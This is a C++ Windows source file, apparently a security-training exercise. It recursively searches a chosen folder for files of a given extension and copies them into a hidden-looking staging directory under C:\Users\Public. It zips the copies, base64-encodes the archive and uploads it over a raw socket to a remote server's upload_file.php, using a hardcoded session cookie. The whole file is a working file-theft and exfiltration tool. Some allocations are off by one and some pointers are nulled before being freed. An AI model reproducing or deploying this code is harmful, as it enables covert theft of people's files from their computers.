//zip.lib , ws2_32.lib
#include "pch.h"
#include <stdio.h>
#include "stl.h"
#include <WinSock2.h>
#include <sys/types.h>
#include <io.h>
#include <sys/stat.h>
#include <fcntl.h> 
#include <iostream>

// Search_File
#include <cstring>
#include <Windows.h>

//mkdir
#include <direct.h>
#include <string.h>

//CopyFIle
#include <Winbase.h>

//Zip
#include "Zipper.h"


#define MAXBUF 1024
#define DATA_SIZE 1024*1024*10 //10MB
#define MAXLINE 409600
#define STL_FILE 1
#define STL_DIRECTORY 2

// base64 ~
static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* b64_encode(const unsigned char* in, size_t len)
{
	char* out;
	size_t  elen,i,j,v;
	
	if (in == NULL || len == 0)
		return NULL;

	//encoded_size = elen
	elen = len;
	if (len % 3 != 0)
		elen += 3 - (len % 3);
	elen /= 3;
	elen *= 4;

	out = (char*)malloc(elen + 1);
	out[elen] = '\0';

	for (i = 0, j = 0; i < len; i += 3, j += 4) {
		v = in[i];
		v = i + 1 < len ? v << 8 | in[i + 1] : v << 8;
		v = i + 2 < len ? v << 8 | in[i + 2] : v << 8;

		out[j] = b64chars[(v >> 18) & 0x3F];
		out[j + 1] = b64chars[(v >> 12) & 0x3F];
		if (i + 1 < len) {
			out[j + 2] = b64chars[(v >> 6) & 0x3F];
		}
		else {
			out[j + 2] = '=';
		}
		if (i + 2 < len) {
			out[j + 3] = b64chars[v & 0x3F];
		}
		else {
			out[j + 3] = '=';
		}
	}

	return out;
}

// ~ base64

int makeSocket(char* server_ip) {
	WSADATA wsaData;
	int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaResult == INVALID_SOCKET) {
		printf("WSAStartup failed : %d\n", wsaResult);
		exit(1);
	}

	struct sockaddr_in serverAddr;
	int sock;
	/* Create areliable, stream socket using TCP */
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		printf("socket create failed\n");
		printf("%d\n", WSAGetLastError());
	}

	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = PF_INET;
	serverAddr.sin_addr.s_addr = inet_addr(server_ip);
	//serverAddr.sin_port = ntohs(0x50); 
	serverAddr.sin_port = ntohs(0x22B8);

	if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
		printf("connet() failed\n");

	return sock;
}

void send_file(char* server_ip, const char* fileDir, const char* filename)
{
	//server_ip = (char*)"192.168.219.102";
	//fileDir = "C:\\Users\\qnah2\\Desktop\\stealien\\http zip post.zip";
	//filename = "http zip post.zip";
	char* packet;
	char* pre_body1 = (char*)malloc(1024);
	char* pre_body2 = (char*)malloc(1024);
	char* post_body = (char*)malloc(1024);
	char* packet_header = (char*)malloc(MAXLINE + 1);
	char* boundary = (char*)"----WebKitFormBoundaryW0SW0FtZUlcnhcaN";
	char* body = (char*)malloc(DATA_SIZE);
	// socket --------------------------
	int sock = makeSocket(server_ip);

	printf("send file name : %s\n", filename);
	//open file --------------------------
	FILE* fp = fopen(fileDir, "rb");
	if (fp == NULL) {
		printf("file can't read\n");
		fclose(fp);
		exit(1);
	}
	//file size check 
	fseek(fp, 0, SEEK_END);
	int file_size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char* fileBuf = (char*)malloc(file_size);
	if (fread(fileBuf, sizeof(char), file_size, fp) == -1) {
		printf("fread error\n");
		exit(1);
	}

	fileBuf = b64_encode((const unsigned char*)fileBuf, file_size);
	file_size = strlen(fileBuf);
	
	// make body --------------------------
	sprintf(pre_body1, "--%s\r\n" //boundary	
		"Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
		"Content-Type: application/x-zip-compressed\r\n\r\n", boundary, filename);

	sprintf(pre_body2,
		"\r\n--%s\r\n" //boundary
		"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n"
		"10\r\n"
		"--%s\r\n" //boundary
		"Content-Disposition: form-data; name=\"form\"\r\n\r\n"
		"Upload"
		, boundary, boundary);


	sprintf(post_body, "\r\n--%s--\r\n", boundary);

	int pre_len1 = strlen(pre_body1);
	int pre_len2 = strlen(pre_body2);
	int post_len = strlen(post_body);
	int body_len = pre_len1 + file_size + pre_len2 + post_len;

	memcpy(body, pre_body1, pre_len1);
	memcpy(body + pre_len1, fileBuf, file_size);
	memcpy(body + pre_len1 + file_size, pre_body2, pre_len2);
	memcpy(body + pre_len1 + file_size + pre_len2, post_body, post_len);

	//make header--------------------------
	sprintf(packet_header, "POST /upload_file.php HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Connection: keep-alive\r\n"
		"Content-Length: %d\r\n"
		"Content-Type: multipart/form-data; boundary=%s\r\n"
		"Cookie: security_level=0; PHPSESSID=ff663f7375b4d94371af6dce334a82dd\r\n\r\n"
		, server_ip, body_len, boundary);


	int head_len = strlen(packet_header);
	int packet_len = head_len + body_len;
	//header + body --------------------------
	packet = (char*)malloc(packet_len);
	memcpy((char*)packet, packet_header, head_len);
	memcpy((char*)packet + head_len, body, body_len);

	int sendsize = send(sock, packet, packet_len, 0);
	if (sendsize == -1) {
		printf("write failed: %d \n", GetLastError());
		exit(1);
	}
	
	free(fileBuf);
	free(body);
	free(packet_header);
	free(packet);
	fileBuf = NULL;
	body = NULL;
	packet_header = NULL;
	packet = NULL;
	fclose(fp);

	closesocket(sock);
	WSACleanup();
}

bool checkstr(char* filename, char* extension) {
	char* it = (char*)strrchr((const char*)filename, '.');
	if (it != NULL) {
		it += 1;
		if (strcmp(it, extension) == 0) return true;
	}
	return false;
}

char* _unicode(char* u_name, int SW) {
	wchar_t strUnicode[256] = { 0, };
	char* cut_name;
	int nLen, uLen,xlen;
	char* ret_dir;
	char* unicode_name;
	if(SW == STL_FILE) {
			//유니코드로 바꿀 이름 추출  C:\\test\test.txt => test (확장자까지 제거)
			cut_name = strrchr(u_name, '\\') + 1; // C:\\test\test.txt => test.txt
			int cut_name_len = strlen(cut_name); // strlen("test.txt")
			char* extension = strrchr(cut_name, '.');
			int extension_len = strlen(strrchr(cut_name, '.')); // test.txt => strlen(".txt")
			char* ck_name = (char*)malloc(cut_name_len - extension_len);
			memcpy(ck_name, cut_name, cut_name_len - extension_len);
			ck_name[cut_name_len - extension_len] = '\0';

			//유니코드 변환
			nLen = MultiByteToWideChar(CP_ACP, 0, ck_name, strlen(ck_name), NULL, NULL);
			uLen = MultiByteToWideChar(CP_ACP, 0, ck_name, strlen(ck_name), strUnicode, nLen);
			
			unicode_name = (char*)malloc(100);
			for (int i = 0; i < uLen; i++) wsprintf(unicode_name + (i * 6), "0x%04x", strUnicode[i]);

			//기존 이름 유니코드로 변경
			xlen = strlen(u_name) - strlen(cut_name);
			char* x = (char*)malloc(xlen);
			memcpy(x, u_name, xlen); // x= C:\\ 
			x[xlen] = '\0';
			
			//nono_extension = C:\\test\0x00200xAC00
			char* non_extension = (char*)malloc(strlen(x) + strlen(unicode_name));
			sprintf(non_extension, "%s%s", x, unicode_name);
			int ret_dir_size = strlen(non_extension) + extension_len;

			// ret_dir = C:\\test\0x00200xAC00.txt
			char* ret_dir = (char*)malloc(ret_dir_size);
			sprintf(ret_dir, "%s%s", non_extension, extension);
			ret_dir[ret_dir_size] = '\0';
			return ret_dir;
		}
	else{
		//유니코드로 바꿀 이름 추출
		cut_name = strrchr(u_name, '\\') + 1; // C:\\test => test

		//유니코드로 변환
		nLen = MultiByteToWideChar(CP_ACP, 0, cut_name, strlen(cut_name), NULL, NULL);
		uLen = MultiByteToWideChar(CP_ACP, 0, cut_name, strlen(cut_name), strUnicode, nLen);

		unicode_name = (char*)malloc(100);
		for (int i = 0; i < uLen; i++) wsprintf(unicode_name + (i * 6), "0x%04x", strUnicode[i]);

		//기존 이름 유니코드로 변경
		xlen = strlen(u_name) - strlen(cut_name);
		char* x = (char*)malloc(xlen);
		memcpy(x, u_name, xlen); // x= C:\\ 
		x[xlen] = '\0';

		ret_dir = (char*)malloc(strlen(x) + strlen(unicode_name));
		sprintf(ret_dir, "%s%s", x, unicode_name);
		return ret_dir;
	} 
	
}

//path 탐색 폴더, copy_dir1 탐색 폴더 복사
bool Search_File(char* Path, char* copy_dir1, char* extension) {
	copy_dir1 = _unicode(copy_dir1, STL_DIRECTORY);
	int mkdirResult = mkdir(copy_dir1);	// 현재 경로에 해당하는 저장 폴더 생성 (구조유지 목적)
	if (mkdirResult == -1) {
		printf("mkdir Error \n");
		exit(1);
	}

	bool file_ck = true;
	char NextDir1[0x100];
	char FindName[0x100];
	char NextDir[0x100];
	WIN32_FIND_DATA FindData;
	BOOL result = FALSE;
	sprintf_s(FindName, sizeof(FindName), "%s\\*", Path); //와일드카드 사용

//	printf("Path : %s\n", FindName);
	HANDLE hFind = FindFirstFile(FindName, &FindData);	//FindFirstFile() 와일드카드 사용가능
	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("Error - Can't find a file : %d\n", GetLastError());
		exit(1);
	}
	while (TRUE)
	{
		if (FindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes == 18)
		{	/*
				- 찾은 파일의 속성이 폴더인지 확인.
				- 폴더 속성이 맞고, 이름이 "." 과 ".." 인지 확인.
				- 둘 다 아니라면 폴더 이름을 추가 후 재귀.
			*/
			if (strcmp((const char*)FindData.cFileName, ".") && strcmp((const char*)FindData.cFileName, ".."))
			{
				sprintf_s(NextDir, sizeof(NextDir), "%s\\%s", Path, FindData.cFileName);
				sprintf_s(NextDir1, sizeof(NextDir), "%s\\%s", copy_dir1, FindData.cFileName);
				bool del_ch = Search_File(NextDir, NextDir1, extension);
				if (del_ch)	rmdir(NextDir1);		//폴더안에 파일 없으면 폴더 삭제  , 이 코드 삭제시 폴더에 파일이 없어도 폴더가 생성됨(파일이 없어도 폴더 구조 확인 가능)
			}
		}
		else
		{	/* 폴더가 아니라면 파일의 경로와 이름을 출력 */
			if (checkstr(FindData.cFileName, extension)) {
				file_ck = false;
				char buf[300];
				char buf1[300];
				sprintf_s(buf, sizeof(buf), "%s\\%s", Path, FindData.cFileName);
				sprintf_s(buf1, sizeof(buf1), "%s\\%s", copy_dir1, FindData.cFileName);
				
				strcpy(buf1, _unicode(buf1, STL_FILE));

				int CopyResult = CopyFile(buf, buf1, FALSE);
				if (CopyResult == 0) {
					printf("GetLastError: %d\n", GetLastError());
					exit(1);
				}
			}
		}
		result = FindNextFile(hFind, &FindData);
		if (!result)
		{
			if (GetLastError() == ERROR_NO_MORE_FILES)
			{	/* 폴더에 더 이상 파일이 없는 경우 종료 */
				break;
			}
		}
	}
	return file_ck;
}

char* mmkdir(char* dir) {	//폴더 생성 중복검사
	int cnt = 1; 
	char* x =NULL;
	char y[100];
	int mkdirRs = mkdir(dir);
	while (1) {
		if (mkdirRs != -1) {
			if (x == NULL) return dir;
			else return x;
		}
		else if (mkdirRs == -1 && GetLastError() == 183) { //중복이름 
			itoa(cnt, y, 10);
			x = (char*)malloc(strlen(dir)+strlen(y));
			sprintf(x, "%s%d", dir, cnt);
		}
		else if (mkdirRs == -1 && GetLastError() != 183) {
			printf("mmkdir() Error : %d\n", GetLastError());
			exit(1);
		}
		else
		{
			printf("[+] mmkdir() : 예상치 못한 범위\n");
			exit(1);
		}
		mkdirRs = mkdir(x);
		cnt++;
	}
}

const char* Zip(const char* save_zip_dir, const char* save_zip_name, const char* path) 
{
	save_zip_dir = mmkdir((char*)save_zip_dir);
	const char* mkzip = (const char*)malloc(strlen(save_zip_dir) + strlen("\\") + strlen(save_zip_name));
	sprintf((char*)mkzip, "%s\\%s", save_zip_dir, save_zip_name);
	CZipper zip;
	if (zip.OpenZip(mkzip, path, false)) {	// zip 저장위치 , zip 할 파일 , false
		char* tm = (char*)malloc(strlen(path) + strlen("\\"));
		sprintf(tm, "%s\\", path);
		zip.AddFolderToZip(tm, false);
		tm = NULL;
		free(tm);
	}
	zip.CloseZip();
	return mkzip;
}

void fnc(char* extension, char* path, char* server_addr) {
	// 입력받은 경로와 동일한 구조로 폴더와 파일을 복사하고 
	// 복사한 파일을 압축, 그리고 Server로 전송 .
	const char* save_dir_path = "C:\\Users\\Public\\STL_TEMP_DIR";	// 임시 복사 파일 저장 위치
	const char* save_zip_dir = "C:\\Users\\Public\\STL_SAVE_ZIP";	// 생성할 ZIP파일 저장 폴더 
	const char* save_zip_name = "http zip post.zip";	//	생성할 ZIP파일 이름 

	char * dir1 = strrchr(path, '\\');	
	save_dir_path = mmkdir((char*)save_dir_path);//폴더 생성 중복검사


	//저장 위치에 입력받은 경로랑 동일한 구조 생성 시작
	char* copy_dir = (char*)malloc(strlen(save_dir_path) + strlen(dir1));
	sprintf(copy_dir, "%s%s", save_dir_path, dir1);

	Search_File(path, copy_dir, extension);
	const char* filepath = Zip(save_zip_dir, save_zip_name, save_dir_path);
	send_file(server_addr, filepath, save_zip_name);

	copy_dir = NULL;
	free(copy_dir);
}